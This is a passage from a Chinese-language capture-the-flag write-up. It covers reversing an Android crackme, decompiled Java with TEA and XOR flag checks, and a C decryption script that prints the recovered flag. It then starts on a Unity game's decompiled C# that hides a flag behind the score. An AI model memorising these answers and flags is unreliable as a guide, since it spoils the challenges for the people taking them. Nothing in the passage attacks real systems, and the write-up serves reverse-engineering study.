v; ++v1) &#123;</span><br><span class="line">                        stringBuilder0.append(<span class="string">&#x27;X&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    s = stringBuilder0.toString();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">stringBuilder1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">stringBuilder2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="number">0</span>; v2 &lt; s.length(); ++v2) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(v2 % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                        stringBuilder1.append(s.charAt(v2));</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        stringBuilder2.append(s.charAt(v2));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">b</span> <span class="variable">mainActivity$b0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">b</span>(MainActivity.<span class="built_in">this</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> stringBuilder2.toString();</span><br><span class="line">                <span class="type">byte</span>[] arr_b = stringBuilder1.toString().getBytes();</span><br><span class="line">                <span class="type">int</span> <span class="variable">v3</span> <span class="operator">=</span> arr_b.length &gt;&gt; <span class="number">2</span>;</span><br><span class="line">                <span class="type">int</span>[] arr_v = <span class="keyword">new</span> <span class="title class_">int</span>[v3];</span><br><span class="line">                <span class="type">int</span> <span class="variable">v5</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">v4</span> <span class="operator">=</span> <span class="number">0</span>; v4 &lt; arr_b.length; v4 += <span class="number">4</span>) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">v6</span> <span class="operator">=</span> arr_b[v4 + <span class="number">3</span>];</span><br><span class="line">                    <span class="keyword">if</span>(v6 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                        v6 += <span class="number">0x100</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">int</span> <span class="variable">v7</span> <span class="operator">=</span> arr_b[v4 + <span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">if</span>(v7 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                        v7 += <span class="number">0x100</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">int</span> <span class="variable">v8</span> <span class="operator">=</span> arr_b[v4 + <span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">if</span>(v8 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                        v8 += <span class="number">0x100</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    arr_v[v5] = v6 | v7 &lt;&lt; <span class="number">8</span> | v8 &lt;&lt; <span class="number">16</span> | arr_b[v4] &lt;&lt; <span class="number">24</span>;</span><br><span class="line">                    ++v5;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> <span class="variable">v9</span> <span class="operator">=</span> arr_v[<span class="number">0</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">v10</span> <span class="operator">=</span> arr_v[<span class="number">1</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">v11</span> <span class="operator">=</span> arr_v[<span class="number">2</span>];</span><br><span class="line">                <span class="type">int</span>[] arr_v1 = mainActivity$b0.a;</span><br><span class="line">                <span class="type">int</span> <span class="variable">key_0</span> <span class="operator">=</span> arr_v1[<span class="number">0</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">key_1</span> <span class="operator">=</span> arr_v1[<span class="number">1</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">key_2</span> <span class="operator">=</span> arr_v1[<span class="number">2</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">key_3</span> <span class="operator">=</span> arr_v1[<span class="number">3</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">v16</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">v17</span> <span class="operator">=</span> <span class="number">0</span>; v17 &lt; <span class="number">0x20</span>; ++v17) &#123;</span><br><span class="line">                    v16 += -<span class="number">1640531527</span>;</span><br><span class="line">                    v9 += (v10 &lt;&lt; <span class="number">4</span>) + key_0 ^ v10 + v16 ^ (v10 &gt;&gt; <span class="number">5</span>) + key_1;</span><br><span class="line">                    v10 += (v9 &lt;&lt; <span class="number">4</span>) + key_2 ^ v9 + v16 ^ (v9 &gt;&gt; <span class="number">5</span>) + key_3;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                arr_v[<span class="number">0</span>] = v9;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">v18</span> <span class="operator">=</span> <span class="number">0</span>; v18 &lt; <span class="number">0x20</span>; ++v18) &#123;</span><br><span class="line">                    v16 += -<span class="number">1640531527</span>;</span><br><span class="line">                    v11 += (v10 &lt;&lt; <span class="number">4</span>) + key_0 ^ v10 + v16 ^ (v10 &gt;&gt; <span class="number">5</span>) + key_1;</span><br><span class="line">                    v10 += (v11 &lt;&lt; <span class="number">4</span>) + key_2 ^ v11 + v16 ^ (v11 &gt;&gt; <span class="number">5</span>) + key_3;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                arr_v[<span class="number">1</span>] = v11;</span><br><span class="line">                arr_v[<span class="number">2</span>] = v10;</span><br><span class="line">                <span class="type">byte</span>[] arr_b1 = <span class="keyword">new</span> <span class="title class_">byte</span>[v3 &lt;&lt; <span class="number">2</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">v20</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">v19</span> <span class="operator">=</span> <span class="number">0</span>; v19 &lt; v3; ++v19) &#123;</span><br><span class="line">                    arr_b1[v20 + <span class="number">3</span>] = (<span class="type">byte</span>)(arr_v[v19] &amp; <span class="number">0xFF</span>);</span><br><span class="line">                    arr_b1[v20 + <span class="number">2</span>] = (<span class="type">byte</span>)(arr_v[v19] &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">                    arr_b1[v20 + <span class="number">1</span>] = (<span class="type">byte</span>)(arr_v[v19] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">                    arr_b1[v20] = (<span class="type">byte</span>)(arr_v[v19] &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">                    v20 += <span class="number">4</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">v21</span> <span class="operator">=</span> <span class="number">0</span>; v21 &lt; <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;-<span class="number">91</span>, -<span class="number">8</span>, -<span class="number">110</span>, -<span class="number">55</span>, -<span class="number">49</span>, <span class="number">75</span>, <span class="number">0x73</span>, <span class="number">13</span>, -<span class="number">76</span>, (<span class="type">byte</span>)<span class="number">0x8F</span>, <span class="number">102</span>, <span class="number">80</span>&#125;.length; ++v21) &#123;</span><br><span class="line">                    System.out.println(((<span class="type">int</span>)arr_b1[v21]));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> <span class="variable">v23</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">v22</span> <span class="operator">=</span> <span class="number">0</span>; <span class="literal">true</span>; ++v22) &#123;</span><br><span class="line">                    <span class="type">byte</span>[] arr_b2 = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;-<span class="number">91</span>, -<span class="number">8</span>, -<span class="number">110</span>, -<span class="number">55</span>, -<span class="number">49</span>, <span class="number">75</span>, <span class="number">0x73</span>, <span class="number">13</span>, -<span class="number">76</span>, (<span class="type">byte</span>)<span class="number">0x8F</span>, <span class="number">102</span>, <span class="number">80</span>&#125;;</span><br><span class="line">                    <span class="keyword">if</span>(v22 &gt;= arr_b2.length) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(arr_b1[v22] != arr_b2[v22]) &#123;</span><br><span class="line">                        Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;You\&#x27;re Wrong!\n&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                        v23 = <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">Intent</span> <span class="variable">intent0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(MainActivity.<span class="built_in">this</span>, MainActivity2.class);</span><br><span class="line">                intent0.putExtra(<span class="string">&quot;ad@#E!@a123&quot;</span>, s1);</span><br><span class="line">                intent0.putExtra(<span class="string">&quot;eCAS213@!@3&quot;</span>, arr_b1);</span><br><span class="line">                <span class="keyword">if</span>(v23 == <span class="number">1</span>) &#123;</span><br><span class="line">                    MainActivity.<span class="built_in">this</span>.startActivity(intent0);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">package</span> com.example.babyapk_1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> b.f;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity2</span> <span class="keyword">extends</span> <span class="title class_">f</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// b.f</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle0)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle0);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F0B001D</span>);  <span class="comment">// layout:activity_main2</span></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent0</span> <span class="operator">=</span> <span class="built_in">this</span>.getIntent();</span><br><span class="line">        <span class="type">byte</span>[] arr_b = intent0.getStringExtra(<span class="string">&quot;ad@#E!@a123&quot;</span>).getBytes();</span><br><span class="line">        <span class="type">byte</span>[] arr_b1 = intent0.getByteArrayExtra(<span class="string">&quot;eCAS213@!@3&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> <span class="number">0</span>; v &lt; arr_b1.length; ++v) &#123;</span><br><span class="line">            arr_b1[v] = (<span class="type">byte</span>)(arr_b1[v] ^ arr_b[v % arr_b.length]);</span><br><span class="line">            <span class="keyword">if</span>(arr_b1[v] != <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">107</span>, -<span class="number">106</span>, <span class="number">0xFFFFFFA1</span>, <span class="number">0xFFFFFF8D</span>, <span class="number">0xFFFFFF89</span>, <span class="number">0x7F</span>, <span class="number">26</span>, <span class="number">0x79</span>, -<span class="number">62</span>, -<span class="number">20</span>, <span class="number">86</span>, <span class="number">9</span>&#125;[v]) &#123;</span><br><span class="line">                Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;N0T Right,Maybe try more harder?\n&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                v1 = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(v1 == <span class="number">1</span>) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Congratulations!&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当MainActivity1中的匹配通过后才会进行MainActivity2的另一部分加密 主要是分奇偶索引进行TEA或异或加密 据此写出解密脚本</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> arr_even[<span class="number">12</span>] = &#123;<span class="number">-107</span>, <span class="number">-106</span>, <span class="number">0xFFFFFFA1</span>, <span class="number">0xFFFFFF8D</span>, <span class="number">0xFFFFFF89</span>, <span class="number">0x7F</span>, <span class="number">26</span>, <span class="number">0x79</span>, <span class="number">-62</span>, <span class="number">-20</span>, <span class="number">86</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key_even[<span class="number">12</span>] = &#123;<span class="number">-91</span>, <span class="number">-8</span>, <span class="number">-110</span>, <span class="number">-55</span>, <span class="number">-49</span>, <span class="number">75</span>, <span class="number">0x73</span>, <span class="number">13</span>, <span class="number">-76</span>, <span class="number">0x8F</span>, <span class="number">102</span>, <span class="number">80</span>&#125;;</span><br><span class="line">    <span class="type">char</span> flag_even[<span class="number">12</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)&#123;</span><br><span class="line">        flag_even[i] = arr_even[i] ^ key_even[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> flag_odd_[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i += <span class="number">4</span>)&#123;</span><br><span class="line">        flag_odd_[(<span class="type">int</span>)(i / <span class="number">4</span>)] = key_even[i + <span class="number">3</span>] | key_even[i + <span class="number">2</span>] &lt;&lt; <span class="number">8</span> | key_even[i + <span class="number">1</span>] &lt;&lt; <span class="number">16</span> | key_even[i] &lt;&lt; <span class="number">24</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> TEA_key[<span class="number">4</span>] = &#123;<span class="number">2023708229</span>, <span class="number">-158607964</span>, <span class="number">0x81963FFA</span>, <span class="number">0x458FAC58</span>&#125;;</span><br><span class="line">    <span class="type">int</span> delta = <span class="number">-1640531527</span> * <span class="number">0x40</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; i++)&#123;</span><br><span class="line">        flag_odd_[<span class="number">2</span>] -= (flag_odd_[<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) + TEA_key[<span class="number">2</span>] ^ flag_odd_[<span class="number">1</span>] + delta ^ (flag_odd_[<span class="number">1</span>] &gt;&gt; <span class="number">5</span>) + TEA_key[<span class="number">3</span>];</span><br><span class="line">        flag_odd_[<span class="number">1</span>] -= (flag_odd_[<span class="number">2</span>] &lt;&lt; <span class="number">4</span>) + TEA_key[<span class="number">0</span>] ^ flag_odd_[<span class="number">2</span>] + delta ^ (flag_odd_[<span class="number">2</span>] &gt;&gt; <span class="number">5</span>) + TEA_key[<span class="number">1</span>];</span><br><span class="line">        delta += <span class="number">1640531527</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; i++)&#123;</span><br><span class="line">        flag_odd_[<span class="number">2</span>] -= (flag_odd_[<span class="number">0</span>] &lt;&lt; <span class="number">4</span>) + TEA_key[<span class="number">2</span>] ^ flag_odd_[<span class="number">0</span>] + delta ^ (flag_odd_[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>) + TEA_key[<span class="number">3</span>];</span><br><span class="line">        flag_odd_[<span class="number">0</span>] -= (flag_odd_[<span class="number">2</span>] &lt;&lt; <span class="number">4</span>) + TEA_key[<span class="number">0</span>] ^ flag_odd_[<span class="number">2</span>] + delta ^ (flag_odd_[<span class="number">2</span>] &gt;&gt; <span class="number">5</span>) + TEA_key[<span class="number">1</span>];</span><br><span class="line">        delta += <span class="number">1640531527</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flag_odd[<span class="number">12</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        flag_odd[<span class="number">3</span> - i] = (flag_odd_[<span class="number">0</span>] &gt;&gt; i * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        flag_odd[<span class="number">7</span> - i] = (flag_odd_[<span class="number">2</span>] &gt;&gt; i * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        flag_odd[<span class="number">11</span> - i] = (flag_odd_[<span class="number">1</span>] &gt;&gt; i * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SYC&#123;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,  flag_odd[(<span class="type">int</span>)(i / <span class="number">2</span>)]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, flag_even[(<span class="type">int</span>)(i / <span class="number">2</span>)]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    <span class="comment">// SYC&#123;T00nV3tD3F34Tint0vict0rY&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="是男人就来扎针-Unity引擎游戏逆向"><a href="#是男人就来扎针-Unity引擎游戏逆向" class="headerlink" title="是男人就来扎针 | Unity引擎游戏逆向"></a>是男人就来扎针 | Unity引擎游戏逆向</h3><p>Unity引擎游戏的控制逻辑一般存放在<code>.\*_Data\Managed\Assembly-CSharp.dll</code>中 用dnspy打开 主要逻辑如下</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"><span class="keyword">using</span> UnityEngine.SceneManagement;</span><br><span class="line"><span class="keyword">using</span> UnityEngine.UI;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Token: 0x02000002 RID: 2</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">GameManager</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Token: 0x06000002 RID: 2 RVA: 0x000020A9 File Offset: 0x000004A9</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">RemoveDash</span>(<span class="params"><span class="built_in">string</span> str</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        str = str.Replace(<span class="string">&quot;-&quot;</span>, <span class="built_in">string</span>.Empty);</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x06000003 RID: 3 RVA: 0x000020C0 File Offset: 0x000004C0</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">what</span>(<span class="params"><span class="built_in">string</span> str</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        MD5 md = MD5.Create();</span><br><span class="line">        <span class="built_in">byte</span>[] bytes = Encoding.Default.GetBytes(str);</span><br><span class="line">        <span class="built_in">byte</span>[] <span class="keyword">value</span> = md.ComputeHash(bytes);</span><br><span class="line">        <span class="keyword">return</span> GameManager.RemoveDash(BitConverter.ToString(<span class="keyword">value</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x06000004 RID: 4 RVA: 0x000020F4 File Offset: 0x000004F4</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.startPoint = GameObject.Find(<span class="string">&quot;StartPoint&quot;</span>).transform;</span><br><span class="line">        <span class="keyword">this</span>.spawnPoint = GameObject.Find(<span class="string">&quot;SpawnPoint&quot;</span>).transform;</span><br><span class="line">        <span class="keyword">this</span>.mainCamera = Camera.main;</span><br><span class="line">        <span class="keyword">this</span>.SpawnPin();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x06000005 RID: 5 RVA: 0x00002134 File Offset: 0x00000534</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.score == <span class="number">30</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> text = <span class="built_in">string</span>.Empty;</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.magicc.Length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">char</span> c = (<span class="built_in">char</span>)<span class="keyword">this</span>.magicc[i];</span><br><span class="line">                text += c;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.flagText.text = text;</span><br><span class="line">            <span class="keyword">this</span>.nothing += GameManager.what(<span class="keyword">this</span>.flagText.text);</span><br><span class="line">            <span class="keyword">this</span>.nothing += <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.score == <span class="number">40</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> text2 = <span class="built_in">string</span>.Empty;</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; <span class="keyword">this</span>.magic.Length; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">char</span> c2 = (<span class="built_in">char</span>)<span class="keyword">this</span>.magic[j];</span><br><span class="line">                text2 += c2;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.flagText.text = text2;</span><br><span class="line">            text2 += <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.score == <span class="number">100</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.scoreText.text = <span class="string">&quot;!&quot;</span>;</span><br><span class="line">            <span class="keyword">this</span>.flagText.text = <span class="keyword">this</span>.nothing;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.isGameOver)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Input.GetMouseButtonDown(<span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.score++;</span><br><span class="line">            <span class="keyword">this</span>.scoreText.text = <span class="keyword">this</span>.score.ToString();</span><br><span class="line">            <span class="keyword">this</span>.currentPin.StartFly();</span><br><span class="line">            <span class="keyword">this</span>.SpawnPin();</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> k = <span class="number">0</span>; k &lt; <span class="keyword">this</span>.magicc.Length; k++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>.magicc[k] ^= <span class="keyword">this</span>.score;</span><br><span class="line">                <span class="keyword">this</span>.magic[k] ^= <span class="keyword">this</span>.score;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x06000006 RID: 6 RVA: 0x000022F6 File Offset: 0x000006F6</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">SpawnPin</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.currentPin = UnityEngine.Object.Instantiate&lt;GameObject&gt;(<span class="keyword">this</span>.pinPrefab, <span class="keyword">this</span>.spawnPoint.position, <span class="keyword">this</span>.pinPrefab.transform.rotation).GetComponent&lt;Pin&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x06000007 RID: 7 RVA: 0x00002329 File Offset: 0x00000729</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GameOver</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.isGameOver)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        GameObject.Find(<span class="string">&quot;Circle&quot;</span>).GetComponent&lt;RotateSelf&gt;().enabled = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">base</span>.StartCoroutine(<span class="keyword">this</span>.GameOverAnimation());</span><br><span class="line">        <span class="keyword">this</span>.isGameOver = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x06000008 RID: 8 RVA: 0x00002360 File Offset: 0x00000760</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> IEnumerator <span class="title">GameOverAnimation</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (;;)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.mainCamera.backgroundColor = Color.Lerp(<span class="keyword">this</span>.mainCamera.backgroundColor, Color.red, <span class="keyword">this</span>.speed * Time.deltaTime);</span><br><span class="line">            <span class="keyword">this</span>.mainCamera.orthographicSize = Mathf.Lerp(<span class="keyword">this</span>.mainCamera.orthographicSize, <span class="number">4f</span>, <span class="keyword">this</span>.speed * Time.deltaTime);</span><br><span class="line">            <span class="keyword">if</span> (Mathf.Abs(<span class="keyword">this</span>.mainCamera.orthographicSize - <span class="number">4f</span>) &lt; <span class="number">0.01f</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> <span class="keyword">return</span> <span class="keyword">new</span> <span class="title">WaitForSeconds</span>(<span class="params"><span class="number">0.2f</span></span>)</span>;</span><br><span class="line">        SceneManager.LoadScene(SceneManager.GetActiveScene().buildIndex);</span><br><span class="line">        <span class="keyword">yield</span> <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x04000001 RID: 1</span></span><br><span class="line">    <span class="keyword">private</span> Transform startPoint;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x04000002 RID: 2</span></span><br><span class="line">    <span class="keyword">private</span> Transform spawnPoint;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x04000003 RID: 3</span></span><br><span class="line">    <span class="keyword">private</span> Pin currentPin;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x04000004 RID: 4</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">bool</span> isGameOver;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x04000005 RID: 5</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x04000006 RID: 6</span></span><br><span class="line">    <span class="keyword">private</span> Camera mainCamera;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x04000007 RID: 7</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> nothing = <span class="built_in">string</span>.Empty;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token: 0x04000008 RID: 8</span></span><br><span class="line">    <span class="keyword">private</span> <span 